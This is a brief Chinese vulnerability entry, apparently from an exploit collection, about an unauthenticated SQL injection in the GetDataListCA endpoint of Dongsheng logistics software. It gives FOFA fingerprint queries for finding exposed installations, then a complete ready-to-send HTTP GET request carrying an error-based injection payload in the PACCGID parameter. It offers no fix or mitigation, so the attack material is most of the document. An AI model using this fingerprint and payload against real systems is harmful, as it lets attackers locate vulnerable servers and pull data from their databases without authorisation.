## 东胜物流软件GetDataListCA存在SQL注入漏洞

东胜物流软件GetDataListCA存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息。

## fofa

```javascript
body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
```

## poc

```javascript
GET /MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=1%27%29+AND+6782+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286782%3D6782%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--+OevW HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![image-20241114140448209](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141404276.png)
